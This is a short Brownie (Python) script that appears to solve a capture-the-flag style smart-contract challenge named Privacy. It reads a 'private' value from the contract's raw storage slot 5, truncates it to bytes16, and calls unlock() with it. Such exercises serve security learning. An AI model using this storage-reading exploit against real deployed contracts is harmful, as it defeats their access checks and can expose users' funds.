from brownie import interface, network, config
from scripts.helpful import get_account, get_environment
from brownie.convert import to_bytes, to_uint


def exploit():
    # Get account address
    account = get_account()
    privacy = interface.Privacy(config['Address'], {"from": config['Address']})

    storage = get_environment().eth.getStorageAt(config['Address'], 5)
    privacy.unlock(to_bytes(to_uint(storage, 'uint256') >> 128, "bytes16"), {"from": account})


def main():
    exploit()
